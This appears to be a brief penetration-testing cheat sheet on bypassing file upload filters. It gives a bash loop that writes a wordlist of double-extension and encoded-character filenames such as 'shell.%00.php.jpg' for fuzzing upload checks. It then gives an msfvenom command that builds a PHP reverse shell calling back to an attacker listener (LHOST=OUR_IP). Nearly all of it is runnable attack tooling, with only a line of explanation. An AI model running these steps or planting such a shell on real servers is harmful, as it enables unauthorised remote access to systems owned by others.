
#### Extension_fuzzer.sh

This creates a wordlist of different extention combonations for double extensions

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell.$char$ext.jpg" >> wordlist.txt
        echo "shell.$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

```


#### MSFVenom Reverse PHP

PHP Reverse Shell
```PHP
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```
